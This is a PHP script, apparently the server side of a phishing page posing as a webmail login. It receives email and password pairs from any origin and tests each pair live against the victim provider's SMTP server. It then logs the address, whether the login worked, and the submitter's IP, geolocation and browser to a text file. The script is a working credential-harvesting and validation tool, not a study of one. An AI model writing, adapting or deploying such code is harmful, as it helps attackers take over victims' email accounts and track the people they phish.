<?php
// Prevent any output before headers
ob_start();

// Disable error display but keep logging
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Set execution time limit
set_time_limit(30);
ini_set('max_execution_time', 30);

// CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json; charset=utf-8');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Function to safely include files
function safeInclude($file) {
    if (file_exists($file)) {
        return include_once $file;
    }
    return false;
}

// Function to get client IP
function getClientIP() {
    $ipKeys = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Function to get geolocation info
function getGeoInfo($ip) {
    if ($ip === 'Unknown' || $ip === '127.0.0.1') {
        return 'Local/Unknown';
    }
    
    try {
        $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,isp");
        if ($response) {
            $data = json_decode($response, true);
            if ($data && isset($data['country'])) {
                return "{$data['city']}, {$data['regionName']}, {$data['country']} ({$data['isp']})";
            }
        }
    } catch (Exception $e) {
        // Ignore geolocation errors
    }
    
    return 'Unknown location';
}

try {
    // Clear any previous output
    ob_clean();
    
    // Try to include PHPMailer classes safely
    $phpmailerLoaded = false;
    $smtpLoaded = false;
    
    // Try different possible paths for the files
    $possiblePaths = [
        'class.phpmailer.php',
        './class.phpmailer.php',
        dirname(__FILE__) . '/class.phpmailer.php'
    ];
    
    foreach ($possiblePaths as $path) {
        if (file_exists($path)) {
            if (safeInclude($path)) {
                $phpmailerLoaded = true;
                break;
            }
        }
    }
    
    if (!$phpmailerLoaded) {
        throw new Exception('PHPMailer class not found');
    }
    
    // Try to include SMTP class safely
    $smtpPaths = [
        'class.smtp.php',
        'class.smtp_new.php',
        './class.smtp.php',
        './class.smtp_new.php',
        dirname(__FILE__) . '/class.smtp.php',
        dirname(__FILE__) . '/class.smtp_new.php'
    ];
    
    foreach ($smtpPaths as $path) {
        if (file_exists($path)) {
            if (safeInclude($path)) {
                $smtpLoaded = true;
                break;
            }
        }
    }
    
    if (!$smtpLoaded) {
        throw new Exception('SMTP class not found');
    }
    
    // Get POST data
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (!$data) {
        $data = $_POST;
    }
    
    // Validate input
    $email = trim($data['email'] ?? '');
    $password = $data['password'] ?? '';
    
    if (empty($email) || empty($password)) {
        ob_clean();
        echo json_encode([
            'signal' => 'error',
            'success' => false,
            'msg' => 'Email and password are required'
        ]);
        exit();
    }
    
    // Validate email format
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        ob_clean();
        echo json_encode([
            'signal' => 'error',
            'success' => false,
            'msg' => 'Invalid email format'
        ]);
        exit();
    }
    
    // Extract domain from email for SMTP configuration
    $domain = substr(strrchr($email, "@"), 1);
    
    // Common SMTP configurations for popular providers
    $smtpConfigs = [
        'gmail.com' => ['host' => 'smtp.gmail.com', 'port' => 587, 'secure' => 'tls'],
        'yahoo.com' => ['host' => 'smtp.mail.yahoo.com', 'port' => 587, 'secure' => 'tls'],
        'outlook.com' => ['host' => 'smtp-mail.outlook.com', 'port' => 587, 'secure' => 'tls'],
        'hotmail.com' => ['host' => 'smtp-mail.outlook.com', 'port' => 587, 'secure' => 'tls'],
        'live.com' => ['host' => 'smtp-mail.outlook.com', 'port' => 587, 'secure' => 'tls'],
        'aol.com' => ['host' => 'smtp.aol.com', 'port' => 587, 'secure' => 'tls'],
        'icloud.com' => ['host' => 'smtp.mail.me.com', 'port' => 587, 'secure' => 'tls'],
        'me.com' => ['host' => 'smtp.mail.me.com', 'port' => 587, 'secure' => 'tls'],
        'mac.com' => ['host' => 'smtp.mail.me.com', 'port' => 587, 'secure' => 'tls']
    ];
    
    // Default SMTP config (for cPanel/other providers)
    $smtpConfig = $smtpConfigs[$domain] ?? [
        'host' => 'mail.' . $domain,
        'port' => 587,
        'secure' => 'tls'
    ];
    
    // Test SMTP connection
    $testMail = new PHPMailer(true);
    $testMail->isSMTP();
    $testMail->Host = $smtpConfig['host'];
    $testMail->Port = $smtpConfig['port'];
    $testMail->SMTPSecure = $smtpConfig['secure'];
    $testMail->SMTPAuth = true;
    $testMail->Username = $email;
    $testMail->Password = $password;
    $testMail->SMTPDebug = 0;
    $testMail->Timeout = 5;
    $testMail->SMTPKeepAlive = false;
    
    $isValid = false;
    $errorMessage = '';
    
    try {
        // Test connection and authentication
        if ($testMail->smtpConnect()) {
            if ($testMail->smtpAuthenticate($email, $password)) {
                $isValid = true;
                $errorMessage = 'Authentication successful';
            } else {
                $isValid = false;
                $errorMessage = 'Invalid credentials';
            }
            $testMail->smtpClose();
        } else {
            $isValid = false;
            $errorMessage = 'Cannot connect to SMTP server';
        }
    } catch (Exception $e) {
        $isValid = false;
        $errorMessage = 'SMTP Error: ' . $e->getMessage();
    }
    
    // Get client information
    $clientIP = getClientIP();
    $geoInfo = getGeoInfo($clientIP);
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $timestamp = date('Y-m-d H:i:s T');
    
    // Prepare log entry
    $logEntry = sprintf(
        "[%s] Email: %s | Valid: %s | IP: %s | Location: %s | User-Agent: %s | Error: %s\n",
        $timestamp,
        $email,
        $isValid ? 'YES' : 'NO',
        $clientIP,
        $geoInfo,
        $userAgent,
        $errorMessage
    );
    
    // Log the attempt
    @file_put_contents('webmail_login_log.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Clear any output and send JSON response
    ob_clean();
    $response = [
        'signal' => $isValid ? 'ok' : 'error',
        'success' => $isValid,
        'msg' => $isValid ? 'Login successful!' : 'Invalid credentials. Please try again.',
        'details' => [
            'email' => $email,
            'domain' => $domain,
            'smtp_host' => $smtpConfig['host'],
            'smtp_port' => $smtpConfig['port'],
            'smtp_secure' => $smtpConfig['secure'],
            'client_ip' => $clientIP,
            'location' => $geoInfo,
            'timestamp' => $timestamp,
            'notification_sent' => false,
            'notification_disabled' => true,
            'error_message' => $errorMessage
        ]
    ];
    
    echo json_encode($response);
    
} catch (Exception $e) {
    // Log the error
    error_log("Postmailer error: " . $e->getMessage());
    
    // Clear any output and send error response
    ob_clean();
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Server error occurred. Please try again.',
        'details' => [
            'error' => $e->getMessage()
        ]
    ]);
} catch (Error $e) {
    // Handle PHP 7+ errors
    error_log("Postmailer fatal error: " . $e->getMessage());
    
    ob_clean();
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Server error occurred. Please try again.',
        'details' => [
            'error' => 'Internal server error'
        ]
    ]);
}

// End output buffering and send response
ob_end_flush();
?>